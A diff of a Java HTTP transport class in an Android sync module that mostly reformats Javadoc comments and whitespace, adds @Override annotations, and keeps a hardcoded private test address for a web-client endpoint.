@@ -40,14 +40,15 @@ public abstract class HttpTransport extends Transport {
 
 	/**
 	 * Instantiates a new http transport.
-	 *
-	 * @param host the host
+	 * 
+	 * @param host
+	 *            the host
 	 */
 	public HttpTransport(final String host) {
 		// super("http://" + host + ":" + PORT + "/wc12/webclient");
 		// TODO: togliere
 		super("http://192.168.100.100:" + PORT + "/wc12/webclient");
-		//super("http://192.168.1.185:" + PORT + "/wc12/webclient");
+		// super("http://192.168.1.185:" + PORT + "/wc12/webclient");
 
 		this.host = host;
 		cookies = null;
@@ -60,16 +61,16 @@ public abstract class HttpTransport extends Transport {
 
 	/** The stop. */
 	boolean stop;
-	
+
 	/** The follow_moved. */
 	boolean follow_moved = true;
 
 	/** The HEADE r_ contenttype. */
 	private final String HEADER_CONTENTTYPE = "content-type";
-	
+
 	/** The HEADE r_ setcookie. */
 	private final String HEADER_SETCOOKIE = "set-cookie";
-	
+
 	/** The HEADE r_ contentlen. */
 	private final String HEADER_CONTENTLEN = "content-length";
 
@@ -77,14 +78,17 @@ public abstract class HttpTransport extends Transport {
 	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
 	/** The CONTEN t_ type. */
 	private final String CONTENT_TYPE = "application/octet-stream";
-	
+
 	/** The accept wifi. */
 	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
 	boolean acceptWifi = false;
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#close()
 	 */
+	@Override
 	public void close() {
 		cookies = null;
 	}
@@ -92,11 +96,14 @@ public abstract class HttpTransport extends Transport {
 	/**
 	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
 	 * httpclient
-	 *
-	 * @param data the data
+	 * 
+	 * @param data
+	 *            the data
 	 * @return the byte[]
-	 * @throws TransportException the transport exception
+	 * @throws TransportException
+	 *             the transport exception
 	 */
+	@Override
 	public synchronized byte[] command(final byte[] data)
 			throws TransportException {
 
